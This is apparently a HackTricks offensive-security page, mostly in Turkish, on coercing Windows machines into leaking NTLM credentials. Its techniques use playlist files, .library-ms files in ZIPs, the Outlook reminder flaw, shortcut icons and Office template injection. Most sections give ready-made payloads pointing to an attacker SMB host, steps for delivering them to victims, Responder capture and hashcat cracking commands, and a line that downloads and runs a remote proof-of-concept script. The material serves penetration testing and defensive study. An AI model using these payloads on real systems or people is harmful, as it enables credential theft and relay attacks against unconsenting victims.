# NTLM creds çalmak için yerler

{{#include ../../banners/hacktricks-training.md}}

**Çevrimiçi bir Microsoft Word dosyasının indirilmesinden ntlm leaks kaynağına kadar tüm harika fikirleri şu adreste inceleyin: [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/), ntlm leaks kaynağı: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md ve [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player oynatma listeleri (.ASX/.WAX)

Kontrolünüzdeki bir Windows Media Player oynatma listesini hedefin açmasını veya önizlemesini sağlayabilirseniz, girdiyi bir UNC yoluna yönlendirerek Net‑NTLMv2 leak edebilirsiniz. WMP, referans verilen medyayı SMB üzerinden almaya çalışacak ve otomatik olarak kimlik doğrulaması yapacaktır.

Örnek payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Toplama ve kırma akışı:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP içine gömülü .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer, .library-ms dosyalarını ZIP arşivinin içinden doğrudan açıldığında güvensiz şekilde işler. Kütüphane tanımı uzak bir UNC yoluna işaret ediyorsa (ör. \\attacker\share), ZIP içindeki .library-ms'e göz atmak/başlatmak Explorer'ın UNC'yi taramasına ve attacker'a NTLM kimlik doğrulaması göndermesine neden olur. Bu, çevrimdışı kırılabilecek veya potansiyel olarak relay yapılabilecek bir NetNTLMv2 sağlar.

attacker UNC'sine işaret eden minimal .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operasyonel adımlar
- Yukarıdaki XML ile .library-ms dosyasını oluşturun (IP/hostname'inizi ayarlayın).
- Dosyayı zipleyin (Windows'ta: Send to → Compressed (zipped) folder) ve ZIP'i hedefe teslim edin.
- Bir NTLM capture listener çalıştırın ve kurbanın ZIP içinden .library-ms'i açmasını bekleyin.


### Outlook takvim hatırlatıcı ses yolu (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows takvim öğelerindeki genişletilmiş MAPI özelliği PidLidReminderFileParameter'ı işliyordu. Eğer bu özellik bir UNC yoluna işaret ediyorsa (ör. \\attacker\share\alert.wav), hatırlatıcı tetiklendiğinde Outlook SMB paylaşımına bağlanır ve kullanıcının Net‑NTLMv2'sini herhangi bir tıklama olmadan leak eder. Bu 14 Mart 2023'te yamalandı, ancak legacy/untouched fleets ve historical incident response için hâlâ çok önemli.

PowerShell (Outlook COM) ile hızlı exploitation:
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Dinleyici tarafı:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notes
- Hedefte, hatırlatıcı tetiklendiğinde yalnızca Outlook for Windows çalışıyor olması yeterlidir.
- Bu leak Net‑NTLMv2 sağlar; offline kırma veya relay için uygundur (pass‑the‑hash için değil).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer kısayol ikonlarını otomatik olarak gösterir. Son araştırmalar, Microsoft’ün UNC‑icon kısayolları için Nisan 2025 yamasından sonra bile, kısayol hedefini bir UNC yolunda barındırıp ikonun yerelde tutulmasıyla hiç tıklama gerektirmeden NTLM kimlik doğrulamasının tetiklenebileceğini gösterdi (yamanın atlatılması CVE‑2025‑50154 olarak atandı). Sadece klasöre bakmak, Explorer'ın uzak hedeften meta verileri almasına ve NTLM'i saldırganın SMB sunucusuna göndermesine neden olur.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program Kısayolu payload (.lnk) ile PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Kısayolu bir ZIP'e koyun ve kurbanın göz atmasını sağlayın.
- Kısayolu kurbanın açacağı yazılabilir bir share'e yerleştirin.
- Aynı klasördeki diğer lure files ile birleştirerek Explorer'ın öğeleri önizlemesini sağlayın.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office documents can reference an external template. If you set the attached template to a UNC path, opening the document will authenticate to SMB.

Minimal DOCX relationship changes (word/ içinde):

1) word/settings.xml dosyasını düzenleyin ve ekli şablon referansını ekleyin:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels dosyasını düzenleyin ve rId1337'i UNC'inize yönlendirin:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx olarak yeniden paketle ve teslim et. SMB capture listener'ını çalıştır ve açılmasını bekle.

Yakalama sonrası relaying veya NTLM'i kötüye kullanma fikirleri için bak:

{{#ref}}
README.md
{{#endref}}


## Referanslar
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
